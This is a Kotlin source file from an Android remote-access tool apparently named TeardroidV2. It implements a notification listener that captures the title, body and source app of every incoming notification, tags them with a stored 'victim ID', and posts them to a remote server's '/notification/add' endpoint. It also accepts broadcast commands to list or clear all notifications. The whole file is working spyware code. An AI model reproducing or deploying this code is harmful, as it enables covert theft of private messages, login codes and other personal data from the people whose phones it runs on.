package com.example.teardroidv2

import android.app.Notification
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject
import Request
import android.util.Log


class NotificationListenerService : NotificationListenerService() {
    private val TAG = AppInfo.TAG
    private var nlservicereciver: NLServiceReceiver? = null
    override fun onCreate() {
        super.onCreate()
        nlservicereciver = NLServiceReceiver()
        val filter = IntentFilter()
        filter.addAction(AppInfo.PackageName)
        registerReceiver(nlservicereciver, filter)
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(nlservicereciver)
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        Request.init(this)
        val jsonData = JSONObject()
        val titleText = sbn.notification.extras.getCharSequence(Notification.EXTRA_TITLE).toString()
        val notificationBodyText = sbn.notification.extras.getCharSequence(Notification.EXTRA_BIG_TEXT).toString()
        val i = Intent(AppInfo.PackageName)
        i.putExtra(
            "notification_event", """onNotificationPosted :${sbn.packageName}""".trimIndent()
        )
        jsonData.put("id",sbn.id)
        jsonData.put("device_id",getVictimID())
        jsonData.put("Package",sbn.packageName)
        jsonData.put("titleText",titleText)
        jsonData.put("notificationBodyText",notificationBodyText)
        Request("/notification/add",{
        },{
        }).post(jsonData)
        sendBroadcast(i)
    }

    private fun getVictimID(): String {
        val VictimDataStore = getSharedPreferences(AppInfo.VictimDatastore, MODE_PRIVATE)
        return VictimDataStore.getString(AppInfo.VictimID,"invalid ID")!!
    }

    internal inner class NLServiceReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.getStringExtra("command") == "clearall") {
                cancelAllNotifications()
            } else if (intent.getStringExtra("command") == "list") {
                val i1 = Intent(AppInfo.PackageName)
                i1.putExtra("notification_event", "=====================")
                sendBroadcast(i1)
                var i = 1
                this@NotificationListenerService.activeNotifications.forEach { sbn ->
                    val i2 = Intent(AppInfo.PackageName)
                    i2.putExtra(
                        "notification_event", """$i ${sbn.packageName}"""
                    )
                    sendBroadcast(i2)
                    i++
                }
                val i3 = Intent(AppInfo.PackageName)
                i3.putExtra("notification_event", "===== Notification List ====")
                sendBroadcast(i3)
            }
        }
    }
}